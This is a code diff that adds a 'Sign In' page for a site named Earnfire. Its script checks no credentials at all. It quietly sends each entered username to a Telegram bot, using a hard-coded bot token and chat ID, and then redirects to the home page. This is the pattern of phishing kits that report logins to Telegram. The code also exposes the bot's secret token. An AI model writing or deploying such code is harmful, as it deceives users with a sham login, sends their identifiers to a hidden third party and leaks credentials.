@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0"> <!-- لحل مشكلة المقاسات -->
+<title>Sign In - Earnfire</title>
+<link rel="stylesheet" href="style.css">
+<script src="app.js" defer></script>
+</head>
+<body class="auth-body">
+
+<div class="auth-box">
+    <h2>Sign In</h2>
+
+    <input type="text" id="loginInput" placeholder="Username or Email">
+    <input type="password" id="loginPassword" placeholder="Password">
+
+    <button onclick="signIn()">Sign In</button>
+
+    <p>No account yet?  
+        <a href="signup.html">Create one</a>
+    </p>
+</div>
+
+<script>
+function signIn() {
+    const login = document.getElementById("loginInput").value;
+    const password = document.getElementById("loginPassword").value;
+
+    // إرسال بيانات تسجيل الدخول للبوت (اختياري)
+    fetch("https://api.telegram.org/bot8439819275:AAHL4bFI1DFNld5PVz3x-k7c9KWXsSHOfTg/sendMessage", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+            chat_id: "6181639490",
+            text: `🔑 تسجيل دخول\n👤 User: ${login}\n🌐 Site: Earnfire`
+        })
+    }).catch(err => console.log(err));
+
+    // توجيه المستخدم للصفحة الرئيسية بعد تسجيل الدخول
+    window.location.href = "index.html";
+}
+</script>
+
+</body>
+</html>
